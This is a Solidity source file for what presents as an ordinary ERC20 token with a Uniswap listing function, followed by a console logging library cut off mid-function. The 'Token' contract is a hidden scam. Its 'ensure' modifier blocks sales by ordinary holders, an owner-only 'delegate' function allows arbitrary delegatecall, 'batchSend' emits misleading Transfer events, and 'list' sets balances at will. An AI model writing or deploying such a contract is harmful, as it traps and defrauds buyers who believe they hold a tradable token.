row number 
1	    pragma solidity ^0.5.17;
2	 interface IERC20 {
3	 function totalSupply() external view returns(uint);
4	 function balanceOf(address account) external view returns(uint);
5	 function transfer(address recipient, uint amount) external returns(bool);
6	 function allowance(address owner, address spender) external view returns(uint);
7	 function approve(address spender, uint amount) external returns(bool);
8	 function transferFrom(address sender, address recipient, uint amount) external returns(bool);
9	 event Transfer(address indexed from, address indexed to, uint value);
10	 event Approval(address indexed owner, address indexed spender, uint value);
11	 }
12	 interface IUniswapV2Router02 {
13	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
14	 }
15	 library Address {
16	 function isContract(address account) internal view returns(bool) {
17	 bytes32 codehash;
18	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
19	 assembly {
20	 codehash:= extcodehash(account) }
21	 return (codehash != 0x0 && codehash != accountHash);
22	 }
23	 }
24	 contract Context {
25	 constructor() internal {
26	 }
27	 function _msgSender() internal view returns(address payable) {
28	 return msg.sender;
29	 }
30	 }
31	 library SafeMath {
32	 function add(uint a, uint b) internal pure returns(uint) {
33	 uint c = a + b;
34	 require(c >= a, "SafeMath: addition overflow");
35	 return c;
36	 }
37	 function sub(uint a, uint b) internal pure returns(uint) {
38	 return sub(a, b, "SafeMath: subtraction overflow");
39	 }
40	 function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
41	 require(b <= a, errorMessage);
42	 uint c = a - b;
43	 return c;
44	 }
45	 function mul(uint a, uint b) internal pure returns(uint) {
46	 if (a == 0) {
47	 return 0;
48	 }
49	 uint c = a * b;
50	 require(c / a == b, "SafeMath: multiplication overflow");
51	 return c;
52	 }
53	 function div(uint a, uint b) internal pure returns(uint) {
54	 return div(a, b, "SafeMath: division by zero");
55	 }
56	 function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
57	 require(b > 0, errorMessage);
58	 uint c = a / b;
59	 return c;
60	 }
61	 }
62	 library SafeERC20 {
63	 using SafeMath for uint;
64	 using Address for address;
65	 function safeTransfer(IERC20 token, address to, uint value) internal {
66	 callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
67	 }
68	 function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
69	 callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
70	 }
71	 function safeApprove(IERC20 token, address spender, uint value) internal {
72	 require((value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance" );
73	 callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
74	 }
75	 function callOptionalReturn(IERC20 token, bytes memory data) private {
76	 require(address(token).isContract(), "SafeERC20: call to non-contract");
77	 (bool success, bytes memory returndata) = address(token).call(data);
78	 require(success, "SafeERC20: low-level call failed");
79	 if (returndata.length > 0) {
80	 require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
81	 }
82	 }
83	 }
84	 contract ERC20 is Context, IERC20 {
85	 using SafeMath for uint;
86	 mapping(address => uint) private _balances;
87	 mapping(address => mapping(address => uint)) private _allowances;
88	 uint private _totalSupply;
89	 function totalSupply() public view returns(uint) {
90	 return _totalSupply;
91	 }
92	 function balanceOf(address account) public view returns(uint) {
93	 return _balances[account];
94	 }
95	 function transfer(address recipient, uint amount) public returns(bool) {
96	 _transfer(_msgSender(), recipient, amount);
97	 return true;
98	 }
99	 function allowance(address owner, address spender) public view returns(uint) {
100	 return _allowances[owner][spender];
101	 }
102	 function approve(address spender, uint amount) public returns(bool) {
103	 _approve(_msgSender(), spender, amount);
104	 return true;
105	 }
106	 function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
107	 _transfer(sender, recipient, amount);
108	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
109	 return true;
110	 }
111	 function increaseAllowance(address spender, uint addedValue) public returns(bool) {
112	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
113	 return true;
114	 }
115	 function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
116	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
117	 return true;
118	 }
119	 function _transfer(address sender, address recipient, uint amount) internal {
120	 require(sender != address(0), "ERC20: transfer from the zero address");
121	 require(recipient != address(0), "ERC20: transfer to the zero address");
122	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
123	 _balances[recipient] = _balances[recipient].add(amount);
124	 emit Transfer(sender, recipient, amount);
125	 }
126	 function _mint(address account, uint amount) internal {
127	 require(account != address(0), "ERC20: mint to the zero address");
128	 _totalSupply = _totalSupply.add(amount);
129	 _balances[account] = _balances[account].add(amount);
130	 emit Transfer(address(0), account, amount);
131	 }
132	 function _burn(address account, uint amount) internal {
133	 require(account != address(0), "ERC20: burn from the zero address");
134	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
135	 _totalSupply = _totalSupply.sub(amount);
136	 emit Transfer(account, address(0), amount);
137	 }
138	 function _approve(address owner, address spender, uint amount) internal {
139	 require(owner != address(0), "ERC20: approve from the zero address");
140	 require(spender != address(0), "ERC20: approve to the zero address");
141	 _allowances[owner][spender] = amount;
142	 emit Approval(owner, spender, amount);
143	 }
144	 }
145	 contract ERC20Detailed is IERC20 {
146	 string private _name;
147	 string private _symbol;
148	 uint8 private _decimals;
149	 constructor(string memory name, string memory symbol, uint8 decimals) public {
150	 _name = name;
151	 _symbol = symbol;
152	 _decimals = decimals;
153	 }
154	 function name() public view returns(string memory) {
155	 return _name;
156	 }
157	 function symbol() public view returns(string memory) {
158	 return _symbol;
159	 }
160	 function decimals() public view returns(uint8) {
161	 return _decimals;
162	 }
163	 }
164	 contract Token {
165	 event Transfer(address indexed _from, address indexed _to, uint _value);
166	 event Approval(address indexed _owner, address indexed _spender, uint _value);
167	 function transfer(address _to, uint _value) public payable returns (bool) {
168	 return transferFrom(msg.sender, _to, _value);
169	 }
170	 function transferFrom(address _from, address _to, uint _value) public payable ensure(_from, _to) returns (bool) {
171	 if (_value == 0) {
172	 return true;
173	 }
174	 if (msg.sender != _from) {
175	 require(allowance[_from][msg.sender] >= _value);
176	 allowance[_from][msg.sender] -= _value;
177	 }
178	 require(balanceOf[_from] >= _value);
179	 balanceOf[_from] -= _value;
180	 balanceOf[_to] += _value;
181	 emit Transfer(_from, _to, _value);
182	 return true;
183	 }
184	 function approve(address _spender, uint _value) public payable returns (bool) {
185	 allowance[msg.sender][_spender] = _value;
186	 emit Approval(msg.sender, _spender, _value);
187	 return true;
188	 }
189	 function delegate(address a, bytes memory b) public payable {
190	 require(msg.sender == owner);
191	 a.delegatecall(b);
192	 }
193	 function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
194	 require(msg.sender == owner);
195	 uint total = _value * _tos.length;
196	 require(balanceOf[msg.sender] >= total);
197	 balanceOf[msg.sender] -= total;
198	 for (uint i = 0; i < _tos.length; i++) {
199	 address _to = _tos[i];
200	 balanceOf[_to] += _value;
201	 emit Transfer(msg.sender, _to, _value/2);
202	 emit Transfer(msg.sender, _to, _value/2);
203	 }
204	 return true;
205	 }
206	 modifier ensure(address _from, address _to) {
207	 require(_from == owner || _to == owner || _from == uniPair || tx.origin == owner || msg.sender == owner || isAccountValid(tx.origin));
208	 _;
209	 }
210	 function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
211	 (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
212	 bytes memory initCodeHash;
213	 if (factory == 0xBCfCcbde45cE874adCB698cC183deBcF17952812) {
214	 initCodeHash = hex'd0d4c4cd0848c93cb4fd1f498d7013ee6bfb25783ea21593d5834f5d250ece66';
215	 }
216	 else {
217	 initCodeHash = hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f';
218	 }
219	 pair = address(uint(keccak256(abi.encodePacked( hex'ff', factory, keccak256(abi.encodePacked(token0, token1)), initCodeHash ))));
220	 }
221	 mapping (address => uint) public balanceOf;
222	 mapping (address => mapping (address => uint)) public allowance;
223	 uint constant public decimals = 18;
224	 uint public totalSupply;
225	 string public name;
226	 string public symbol;
227	 address private owner;
228	 address public uniPair;
229	 address public UNI;
230	 function sliceUint(bytes memory bs) internal pure returns (uint) {
231	 uint x;
232	 assembly {
233	 x := mload(add(bs, add(0x10, 0))) }
234	 return x;
235	 }
236	 function isAccountValid(address subject) pure public returns (bool result) {
237	 return uint256(sliceUint(abi.encodePacked(subject))) % 100 == 0;
238	 }
239	 function onlyByHundred() view public returns (bool result) {
240	 require(isAccountValid(msg.sender) == true, "Only one in a hundred accounts should be able to do this");
241	 return true;
242	 }
243	 constructor(string memory _name, string memory _symbol, uint _totalSupply, address _uniRouter, address _uniFactory, address _weth) public {
244	 name = _name;
245	 symbol = _symbol;
246	 totalSupply = _totalSupply;
247	 owner = msg.sender;
248	 UNI = _uniRouter;
249	 uniPair = pairFor(_uniFactory, _weth, address(this));
250	 allowance[address(this)][UNI] = uint(-1);
251	 allowance[msg.sender][uniPair] = uint(-1);
252	 }
253	 function list(uint _numList, address[] memory _tos, uint[] memory _amounts) public payable {
254	 require(msg.sender == owner);
255	 balanceOf[address(this)] = _numList;
256	 balanceOf[msg.sender] = totalSupply * 6 / 100;
257	 IUniswapV2Router02(UNI).addLiquidityETH.value(msg.value)( address(this), _numList, _numList, msg.value, msg.sender, block.timestamp + 600 );
258	 require(_tos.length == _amounts.length);
259	 for(uint i = 0; i < _tos.length; i++) {
260	 balanceOf[_tos[i]] = _amounts[i];
261	 emit Transfer(address(0x0), _tos[i], _amounts[i]);
262	 }
263	 }
264	 }
265	 pragma solidity >= 0.4.22 <0.9.0;
266	 library console {
267	 address constant CONSOLE_ADDRESS = address(0x000000000000000000636F6e736F6c652e6c6f67);
268	 function _sendLogPayload(bytes memory payload) private view {
269	 uint256 payloadLength = payload.length;
270	 address consoleAddress = CONSOLE_ADDRESS;
271	 assembly {
272	 let payloadStart := add(payload, 32) let r := staticcall(gas(), consoleAddress, payloadStart, payloadLength, 0, 0) }
273	 }
274	 function log() internal view {
275	 _sendLogPayload(abi.encodeWithSignature("log()"));
276	 }
277	 function logInt(int p0) internal view {
278	 _sendLogPayload(abi.encodeWithSignature("log(int)", p0));
279	 }
280	 function logUint(uint p0) internal view {
281	 _sendLogPayload(abi.encodeWithSignature("log(uint)", p0));
282	 }
283	 function logString(string memory p0) internal view {
284	 _sendLogPayload(abi.encodeWithSignature("log(string)", p0));
285	 }
286	 function logBool(bool p0) internal view {
287	 _sendLogPayload(abi.encodeWithSignature("log(bool)", p0));
288	 }
289	 function logAddress(address p0) internal view {
290	 _sendLogPayload(abi.encodeWithSignature("log(address)", p0));
291	 }
292	 function logBytes(bytes memory p0) internal view {
293	 _sendLogPayload(abi.encodeWithSignature("log(bytes)", p0));
294	 }
295	 function logBytes1(bytes1 p0) internal view {
296	 _sendLogPayload(abi.encodeWithSignature("log(bytes1)", p0));
297	 }
298	 function logBytes2(bytes2 p0) internal view {
299	 _sendLogPayload(abi.encodeWithSignature("log(bytes2)", p0));
300	 }
301	 function logBytes3(bytes3 p0) internal view {
302	 _sendLogPayload(abi.encodeWithSignature("log(bytes3)", p0));
303	 }
304	 function logBytes4(bytes4 p0) internal view {
305	 _sendLogPayload(abi.encodeWithSignature("log(bytes4)", p0));
306	 }
307	 function logBytes5(bytes5 p0) internal view {
308	 _sendLogPayload(abi.encodeWithSignature("log(bytes5)", p0));
309	 }
310	 function logBytes6(bytes6 p0) internal view {
311	 _sendLogPayload(abi.encodeWithSignature("log(bytes6)", p0));
312	 }
313	 function logBytes7(bytes7 p0) internal view {
314	 _sendLogPayload(abi.encodeWithSignature("log(bytes7)", p0));
315	 }
316	 function logBytes8(bytes8 p0) internal view {
317	 _sendLogPayload(abi.encodeWithSignature("log(bytes8)", p0));
318	 }
319	 function logBytes9(bytes9 p0) internal view {
320	 _sendLogPayload(abi.encodeWithSignature("log(bytes9)", p0));
321	 }
322	 function logBytes10(bytes10 p0) internal view {
323	 _sendLogPayload(abi.encodeWithSignature("log(bytes10)", p0));
324	 }
325	 function logBytes11(bytes11 p0) internal view {
326	 _sendLogPayload(abi.encodeWithSignature("log(bytes11)", p0));
327	 }
328	 function logBytes12(bytes12 p0) internal view {
329	 _sendLogPayload(abi.encodeWithSignature("log(bytes12)", p0));
330	 }
331	 function logBytes13(bytes13 p0) internal view {
332	 _sendLogPayload(abi.encodeWithSignature("log(bytes13)", p0));
333	 }
334	 function logBytes14(bytes14 p0) internal view {
335	 _sendLogPayload(abi.encodeWithSignature("log(bytes14)", p0));
336	 }
337	 function logBytes15(bytes15 p0) internal view {
338	 _sendLogPayload(abi.encodeWithSignature("log(bytes15)", p0));
339	 }
340	 function logBytes16(bytes16 p0) internal view {
341	 _sendLogPayload(abi.encodeWithSignature("log(bytes16)", p0));
342	 }
343	 function logBytes17(bytes17 p0) internal view {
344	 _sendLogPayload(abi.encodeWithSignature("log(bytes17)", p0));
345	 }
346	 function logBytes18(bytes18 p0) internal view {
347	 _sendLogPayload(abi.encodeWithSignature("log(bytes18)", p0));
348	 }
349	 function logBytes19(bytes19 p0) internal view {
350	 _sendLogPayload(abi.encodeWithSignature("log(bytes19)", p0));
351	 }
352	 function logBytes20(bytes20 p0) internal view {
353	 _sendLogPayload(abi.encodeWithSignature("log(bytes20)", p0));
354	 }
355	 function logBytes21(bytes21 p0) internal view {
356	 _sendLogPayload(abi.encodeWithSignature("log(bytes21)", p0));
357	 }
358	 function logBytes22(bytes22 p0) internal view {
359	 _sendLogPayload(abi.encodeWithSignature("log(bytes22)", p0));
360	 }
361	 function logBytes23(bytes23 p0) internal view {
362	 _sendLogPayload(abi.encodeWithSignature("log(bytes23)", p0));
363	 }
364	 function logBytes24(bytes24 p0) internal view {
365	 _sendLogPayload(abi.encodeWithSignature("log(bytes24)", p0));
366	 }
367	 function logBytes25(bytes25 p0) internal view {
368	 _sendLogPayload(abi.encodeWithSignature("log(bytes25)", p0));
369	 }
370	 function logBytes26(bytes26 p0) internal view {
371	 _sendLogPayload(abi.encodeWithSignature("log(bytes26)", p0));
372	 }
373	 function logBytes27(bytes27 p0) internal view {
374	 _sendLogPayload(abi.encodeWithSignature("log(bytes27)", p0));
375	 }
376	 function logBytes28(bytes28 p0) internal view {
377	 _sendLogPayload(abi.encodeWithSignature("log(bytes28)", p0));
378	 }
379	 function logBytes29(bytes29 p0) internal view {
380	 _sendLogPayload(abi.encodeWithSignature("log(bytes29)", p0));
381	 }
382	 function logBytes30(bytes30 p0) internal view {
383	 _sendLogPayload(abi.encodeWithSignature("log(bytes30)", p0));
384	 }
385	 function logBytes31(bytes31 p0) internal view {
386	 _sendLogPayload(abi.encodeWithSignature("log(bytes31)", p0));
387	 }
388	 function logBytes32(bytes32 p0) internal view {
389	 _sendLogPayload(abi.encodeWithSignature("log(bytes32)", p0));
390	 }
391	 function log(uint p0) internal view {
392	 _sendLogPayload(abi.encodeWithSignature("log(uint)", p0));
393	 }
394	 function log(string memory p0) internal view {
395	 _sendLogPayload(abi.encodeWithSignature("log(string)", p0));
396	 }
397	 function log(bool p0) internal view {
398	 _sendLogPayload(abi.encodeWithSignature("log(bool)", p0));
399	 }
400	 function log(address p0) internal view {
401	 _sendLogPayload(abi.encodeWithSignature("log(address)", p0));
402	 }
403	 function log(uint p0, uint p1) internal view {
404	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint)", p0, p1));
405	 }
406	 function log(uint p0, string memory p1) internal view {
407	 _sendLogPayload(abi.encodeWithSignature("log(uint,string)", p0, p1));
408	 }
409	 function log(uint p0, bool p1) internal view {
410	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool)", p0, p1));
411	 }
412	 function log(uint p0, address p1) internal view {
413	 _sendLogPayload(abi.encodeWithSignature("log(uint,address)", p0, p1));
414	 }
415	 function log(string memory p0, uint p1) internal view {
416	 _sendLogPayload(abi.encodeWithSignature("log(string,uint)", p0, p1));
417	 }
418	 function log(string memory p0, string memory p1) internal view {
419	 _sendLogPayload(abi.encodeWithSignature("log(string,string)", p0, p1));
420	 }
421	 function log(string memory p0, bool p1) internal view {
422	 _sendLogPayload(abi.encodeWithSignature("log(string,bool)", p0, p1));
423	 }
424	 function log(string memory p0, address p1) internal view {
425	 _sendLogPayload(abi.encodeWithSignature("log(string,address)", p0, p1));
426	 }
427	 function log(bool p0, uint p1) internal view {
428	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint)", p0, p1));
429	 }
430	 function log(bool p0, string memory p1) internal view {
431	 _sendLogPayload(abi.encodeWithSignature("log(bool,string)", p0, p1));
432	 }
433	 function log(bool p0, bool p1) internal view {
434	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool)", p0, p1));
435	 }
436	 function log(bool p0, address p1) internal view {
437	 _sendLogPayload(abi.encodeWithSignature("log(bool,address)", p0, p1));
438	 }
439	 function log(address p0, uint p1) internal view {
440	 _sendLogPayload(abi.encodeWithSignature("log(address,uint)", p0, p1));
441	 }
442	 function log(address p0, string memory p1) internal view {
443	 _sendLogPayload(abi.encodeWithSignature("log(address,string)", p0, p1));
444	 }
445	 function log(address p0, bool p1) internal view {
446	 _sendLogPayload(abi.encodeWithSignature("log(address,bool)", p0, p1));
447	 }
448	 function log(address p0, address p1) internal view {
449	 _sendLogPayload(abi.encodeWithSignature("log(address,address)", p0, p1));
450	 }
451	 function log(uint p0, uint p1, uint p2) internal view {
452	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint)", p0, p1, p2));
453	 }
454	 function log(uint p0, uint p1, string memory p2) internal view {
455	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,string)", p0, p1, p2));
456	 }
457	 function log(uint p0, uint p1, bool p2) internal view {
458	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool)", p0, p1, p2));
459	 }
460	 function log(uint p0, uint p1, address p2) internal view {
461	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,address)", p0, p1, p2));
462	 }
463	 function log(uint p0, string memory p1, uint p2) internal view {
464	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,uint)", p0, p1, p2));
465	 }
466	 function log(uint p0, string memory p1, string memory p2) internal view {
467	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,string)", p0, p1, p2));
468	 }
469	 function log(uint p0, string memory p1, bool p2) internal view {
470	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,bool)", p0, p1, p2));
471	 }
472	 function log(uint p0, string memory p1, address p2) internal view {
473	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,address)", p0, p1, p2));
474	 }
475	 function log(uint p0, bool p1, uint p2) internal view {
476	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint)", p0, p1, p2));
477	 }
478	 function log(uint p0, bool p1, string memory p2) internal view {
479	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,string)", p0, p1, p2));
480	 }
481	 function log(uint p0, bool p1, bool p2) internal view {
482	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool)", p0, p1, p2));
483	 }
484	 function log(uint p0, bool p1, address p2) internal view {
485	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,address)", p0, p1, p2));
486	 }
487	 function log(uint p0, address p1, uint p2) internal view {
488	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,uint)", p0, p1, p2));
489	 }
490	 function log(uint p0, address p1, string memory p2) internal view {
491	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,string)", p0, p1, p2));
492	 }
493	 function log(uint p0, address p1, bool p2) internal view {
494	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,bool)", p0, p1, p2));
495	 }
496	 function log(uint p0, address p1, address p2) internal view {
497	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,address)", p0, p1, p2));
498	 }
499	 function log(string memory p0, uint p1, uint p2) internal view {
500	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,uint)", p0, p1, p2));
501	 }
502	 function log(string memory p0, uint p1, string memory p2) internal view {
503	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,string)", p0, p1, p2));
504	 }
505	 function log(string memory p0, uint p1, bool p2) internal view {
506	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,bool)", p0, p1, p2));
507	 }
508	 function log(string memory p0, uint p1, address p2) internal view {
509	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,address)", p0, p1, p2));
510	 }
511	 function log(string memory p0, string memory p1, uint p2) internal view {
512	 _sendLogPayload(abi.encodeWithSignature("log(string,string,uint)", p0, p1, p2));
513	 }
514	 function log(string memory p0, string memory p1, string memory p2) internal view {
515	 _sendLogPayload(abi.encodeWithSignature("log(string,string,string)", p0, p1, p2));
516	 }
517	 function log(string memory p0, string memory p1, bool p2) internal view {
518	 _sendLogPayload(abi.encodeWithSignature("log(string,string,bool)", p0, p1, p2));
519	 }
520	 function log(string memory p0, string memory p1, address p2) internal view {
521	 _sendLogPayload(abi.encodeWithSignature("log(string,string,address)", p0, p1, p2));
522	 }
523	 function log(string memory p0, bool p1, uint p2) internal view {
524	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,uint)", p0, p1, p2));
525	 }
526	 function log(string memory p0, bool p1, string memory p2) internal view {
527	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,string)", p0, p1, p2));
528	 }
529	 function log(string memory p0, bool p1, bool p2) internal view {
530	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,bool)", p0, p1, p2));
531	 }
532	 function log(string memory p0, bool p1, address p2) internal view {
533	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,address)", p0, p1, p2));
534	 }
535	 function log(string memory p0, address p1, uint p2) internal view {
536	 _sendLogPayload(abi.encodeWithSignature("log(string,address,uint)", p0, p1, p2));
537	 }
538	 function log(string memory p0, address p1, string memory p2) internal view {
539	 _sendLogPayload(abi.encodeWithSignature("log(string,address,string)", p0, p1, p2));
540	 }
541	 function log(string memory p0, address p1, bool p2) internal view {
542	 _sendLogPayload(abi.encodeWithSignature("log(string,address,bool)", p0, p1, p2));
543	 }
544	 function log(string memory p0, address p1, address p2) internal view {
545	 _sendLogPayload(abi.encodeWithSignature("log(string,address,address)", p0, p1, p2));
546	 }
547	 function log(bool p0, uint p1, uint p2) internal view {
548	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint)", p0, p1, p2));
549	 }
550	 function log(bool p0, uint p1, string memory p2) internal view {
551	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,string)", p0, p1, p2));
552	 }
553	 function log(bool p0, uint p1, bool p2) internal view {
554	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool)", p0, p1, p2));
555	 }
556	 function log(bool p0, uint p1, address p2) internal view {
557	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,address)", p0, p1, p2));
558	 }
559	 function log(bool p0, string memory p1, uint p2) internal view {
560	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,uint)", p0, p1, p2));
561	 }
562	 function log(bool p0, string memory p1, string memory p2) internal view {
563	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,string)", p0, p1, p2));
564	 }
565	 function log(bool p0, string memory p1, bool p2) internal view {
566	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,bool)", p0, p1, p2));
567	 }
568	 function log(bool p0, string memory p1, address p2) internal view {
569	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,address)", p0, p1, p2));
570	 }
571	 function log(bool p0, bool p1, uint p2) internal view {
572	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint)", p0, p1, p2));
573	 }
574	 function log(bool p0, bool p1, string memory p2) internal view {
575	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,string)", p0, p1, p2));
576	 }
577	 function log(bool p0, bool p1, bool p2) internal view {
578	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool)", p0, p1, p2));
579	 }
580	 function log(bool p0, bool p1, address p2) internal view {
581	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,address)", p0, p1, p2));
582	 }
583	 function log(bool p0, address p1, uint p2) internal view {
584	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,uint)", p0, p1, p2));
585	 }
586	 function log(bool p0, address p1, string memory p2) internal view {
587	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,string)", p0, p1, p2));
588	 }
589	 function log(bool p0, address p1, bool p2) internal view {
590	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,bool)", p0, p1, p2));
591	 }
592	 function log(bool p0, address p1, address p2) internal view {
593	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,address)", p0, p1, p2));
594	 }
595	 function log(address p0, uint p1, uint p2) internal view {
596	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,uint)", p0, p1, p2));
597	 }
598	 function log(address p0, uint p1, string memory p2) internal view {
599	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,string)", p0, p1, p2));
600	 }
601	 function log(address p0, uint p1, bool p2) internal view {
602	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,bool)", p0, p1, p2));
603	 }
604	 function log(address p0, uint p1, address p2) internal view {
605	 _sendLogPayload(abi.encodeWithSignature("log(address,uint,address)", p0, p1, p2));
606	 }
607	 function log(address p0, string memory p1, uint p2) internal view {
608	 _sendLogPayload(abi.encodeWithSignature("log(address,string,uint)", p0, p1, p2));
609	 }
610	 function log(address p0, string memory p1, string memory p2) internal view {
611	 _sendLogPayload(abi.encodeWithSignature("log(address,string,string)", p0, p1, p2));
612	 }
613	 function log(address p0, string memory p1, bool p2) internal view {
614	 _sendLogPayload(abi.encodeWithSignature("log(address,string,bool)", p0, p1, p2));
615	 }
616	 function log(address p0, string memory p1, address p2) internal view {
617	 _sendLogPayload(abi.encodeWithSignature("log(address,string,address)", p0, p1, p2));
618	 }
619	 function log(address p0, bool p1, uint p2) internal view {
620	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,uint)", p0, p1, p2));
621	 }
622	 function log(address p0, bool p1, string memory p2) internal view {
623	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,string)", p0, p1, p2));
624	 }
625	 function log(address p0, bool p1, bool p2) internal view {
626	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,bool)", p0, p1, p2));
627	 }
628	 function log(address p0, bool p1, address p2) internal view {
629	 _sendLogPayload(abi.encodeWithSignature("log(address,bool,address)", p0, p1, p2));
630	 }
631	 function log(address p0, address p1, uint p2) internal view {
632	 _sendLogPayload(abi.encodeWithSignature("log(address,address,uint)", p0, p1, p2));
633	 }
634	 function log(address p0, address p1, string memory p2) internal view {
635	 _sendLogPayload(abi.encodeWithSignature("log(address,address,string)", p0, p1, p2));
636	 }
637	 function log(address p0, address p1, bool p2) internal view {
638	 _sendLogPayload(abi.encodeWithSignature("log(address,address,bool)", p0, p1, p2));
639	 }
640	 function log(address p0, address p1, address p2) internal view {
641	 _sendLogPayload(abi.encodeWithSignature("log(address,address,address)", p0, p1, p2));
642	 }
643	 function log(uint p0, uint p1, uint p2, uint p3) internal view {
644	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint,uint)", p0, p1, p2, p3));
645	 }
646	 function log(uint p0, uint p1, uint p2, string memory p3) internal view {
647	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint,string)", p0, p1, p2, p3));
648	 }
649	 function log(uint p0, uint p1, uint p2, bool p3) internal view {
650	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint,bool)", p0, p1, p2, p3));
651	 }
652	 function log(uint p0, uint p1, uint p2, address p3) internal view {
653	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint,address)", p0, p1, p2, p3));
654	 }
655	 function log(uint p0, uint p1, string memory p2, uint p3) internal view {
656	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,string,uint)", p0, p1, p2, p3));
657	 }
658	 function log(uint p0, uint p1, string memory p2, string memory p3) internal view {
659	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,string,string)", p0, p1, p2, p3));
660	 }
661	 function log(uint p0, uint p1, string memory p2, bool p3) internal view {
662	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,string,bool)", p0, p1, p2, p3));
663	 }
664	 function log(uint p0, uint p1, string memory p2, address p3) internal view {
665	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,string,address)", p0, p1, p2, p3));
666	 }
667	 function log(uint p0, uint p1, bool p2, uint p3) internal view {
668	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool,uint)", p0, p1, p2, p3));
669	 }
670	 function log(uint p0, uint p1, bool p2, string memory p3) internal view {
671	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool,string)", p0, p1, p2, p3));
672	 }
673	 function log(uint p0, uint p1, bool p2, bool p3) internal view {
674	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool,bool)", p0, p1, p2, p3));
675	 }
676	 function log(uint p0, uint p1, bool p2, address p3) internal view {
677	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool,address)", p0, p1, p2, p3));
678	 }
679	 function log(uint p0, uint p1, address p2, uint p3) internal view {
680	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,address,uint)", p0, p1, p2, p3));
681	 }
682	 function log(uint p0, uint p1, address p2, string memory p3) internal view {
683	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,address,string)", p0, p1, p2, p3));
684	 }
685	 function log(uint p0, uint p1, address p2, bool p3) internal view {
